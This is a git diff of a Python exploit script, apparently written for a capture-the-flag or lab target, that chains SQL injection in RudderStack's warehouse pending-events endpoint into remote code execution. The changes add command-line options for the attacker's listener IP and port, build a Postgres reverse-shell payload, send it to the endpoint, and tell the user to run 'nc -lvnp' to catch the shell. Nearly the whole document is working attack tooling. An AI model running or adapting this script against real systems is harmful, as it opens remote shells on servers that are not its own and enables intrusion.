@@ -4,11 +4,19 @@ Date: May 2025
 Description: SQLi to RCE in Rudderstack. It get's the flag from /flag.txt.
 """
 
+#!/usr/bin/env python3
+"""
+Author: Aleksa Zaztezalo
+Date: May 2025
+Description: SQLi to RCE in Rudderstack. It gets the flag from /flag.txt.
+"""
+
 import requests
 import json
 import socket
 import urllib3
 import sys
+import argparse
 
 # Suppress insecure request warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -50,10 +58,12 @@ def send_rudderstack_request(endpoint_url, source_id, proxy_url=None, task_run_i
     port = 80
     if ':' in url_parts[0]:
         port = int(url_parts[0].split(':')[1])
+
+    endpoint_url = endpoint_url + "/v1/warehouse/pending-events?triggerUpload=true"
     
     # Ensure the URL has the proper protocol
     if not endpoint_url.startswith(('http://', 'https://')):
-        endpoint_url = f"http://{endpoint_url}"
+        endpoint_url = f"http://{endpoint_url}/v1/warehouse/pending-events?triggerUpload=true"
     
     # Prepare headers
     headers = {
@@ -94,6 +104,10 @@ def send_rudderstack_request(endpoint_url, source_id, proxy_url=None, task_run_i
     # Setup proxy configuration if provided
     proxies = None
     if proxy_url:
+        # Add http:// prefix if not present
+        if not proxy_url.startswith(('http://', 'https://')):
+            proxy_url = f"http://{proxy_url}" 
+            
         proxies = {
             'http': proxy_url,
             'https': proxy_url
@@ -102,15 +116,18 @@ def send_rudderstack_request(endpoint_url, source_id, proxy_url=None, task_run_i
         # Test proxy connectivity if debug is enabled
         if debug:
             proxy_host = proxy_url.split('://')[-1].split(':')[0]
-            proxy_port = int(proxy_url.split(':')[-1])
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(2)
-                s.connect((proxy_host, proxy_port))
-                s.close()
-                print(f"Debug: Proxy {proxy_host}:{proxy_port} is reachable")
-            except Exception as e:
-                print(f"Warning: Proxy {proxy_host}:{proxy_port} is not reachable: {str(e)}")
+                proxy_port = int(proxy_url.split(':')[-1])
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(2)
+                    s.connect((proxy_host, proxy_port))
+                    s.close()
+                    print(f"Debug: Proxy {proxy_host}:{proxy_port} is reachable")
+                except Exception as e:
+                    print(f"Warning: Proxy {proxy_host}:{proxy_port} is not reachable: {str(e)}")
+            except ValueError:
+                print(f"Warning: Could not parse proxy port from {proxy_url}")
     
     # Try with proxy first (if provided)
     if proxy_url:
@@ -126,7 +143,7 @@ def send_rudderstack_request(endpoint_url, source_id, proxy_url=None, task_run_i
                 verify=False,
                 timeout=10
             )
-
+        
             return response
             
         except requests.exceptions.ProxyError as e:
@@ -155,9 +172,7 @@ def send_rudderstack_request(endpoint_url, source_id, proxy_url=None, task_run_i
                 timeout=10
             )
             
-            print(f"Status Code: {response.status_code}")
-            print(f"Response: {response.text}")
-            
+ 
             return response
             
         except Exception as e:
@@ -166,31 +181,57 @@ def send_rudderstack_request(endpoint_url, source_id, proxy_url=None, task_run_i
     
     return None
 
-# Example usage:
-if __name__ == "__main__":
-    # Example parameters
-    rudderstack_endpoint = "rudderstack:8080/v1/warehouse/pending-events?triggerUpload=true"
-    source_id = send_postgres_revshell("192.168.45.195", "4444")
-    burp_proxy = "127.0.0.1:8080"  # Default Burp proxy address
+def main():
+    # Create argument parser
+    parser = argparse.ArgumentParser(description='SQLi to RCE in Rudderstack')
     
-    # Simple configuration with default values
+    # Add arguments
+    parser.add_argument('-u', '--url', type=str, default="rudderstack:8080/v1/warehouse/pending-events?triggerUpload=true", 
+                        help='RudderStack endpoint URL (default: rudderstack:8080/v1/warehouse/pending-events?triggerUpload=true)')
+    parser.add_argument('-lh', '--lhost', type=str, required=True,
+                        help='Your IP address for the reverse shell')
+    parser.add_argument('-lp', '--lport', type=str, required=True,
+                        help='Your port for the reverse shell')
+    parser.add_argument('-p', '--proxy', type=str,
+                        help='Proxy URL (e.g., 127.0.0.1:8080)')
+    parser.add_argument('-d', '--debug', action='store_true',
+                        help='Enable debug output')
+    parser.add_argument('-nf', '--no-fallback', action='store_true',
+                        help='Disable fallback to direct connection if proxy fails')
+    parser.add_argument('-t', '--task-id', type=str, default="1",
+                        help='Task run ID (default: 1)')
+    
+    # Parse arguments
+    args = parser.parse_args()
+    
+    # Create the SQL injection payload
+    source_id = send_postgres_revshell(args.lhost, args.lport)
+    
+    print(f"[*] Setting up reverse shell to {args.lhost}:{args.lport}")
+    print(f"[*] Make sure you have a listener running with: nc -lvnp {args.lport}")
+    
     try:
-        # With proxy and debug enabled
-        print(f"Sending request to {rudderstack_endpoint} through proxy {burp_proxy}")
+        # Send the request
+        print(f"[*] Sending request to {args.url}")
+        if args.proxy:
+            print(f"[*] Using proxy: {args.proxy}")
+        
         response = send_rudderstack_request(
-            rudderstack_endpoint, 
-            source_id, 
-            proxy_url=burp_proxy,
-            direct_fallback=True,  # Try direct connection if proxy fails
-            debug=True  # Show debug information
+            args.url,
+            source_id,
+            proxy_url=args.proxy,
+            task_run_id=args.task_id,
+            direct_fallback=not args.no_fallback,
+            debug=args.debug
         )
         
-        # To disable the proxy (direct connection only):
-        # response = send_rudderstack_request(rudderstack_endpoint, source_id, proxy_url=None, debug=True)
-        
-        # To disable fallback to direct connection if proxy fails:
-        # response = send_rudderstack_request(rudderstack_endpoint, source_id, proxy_url=burp_proxy, direct_fallback=False, debug=True)
+        print("[*] Request sent successfully")
+        print("[*] If the target is vulnerable, you should receive a reverse shell connection")
+        print("[*] Check your listener!")
         
     except Exception as e:
-        print(f"Fatal error: {str(e)}")
+        print(f"[!] Fatal error: {str(e)}")
         sys.exit(1)
+
+if __name__ == "__main__":
+    main()
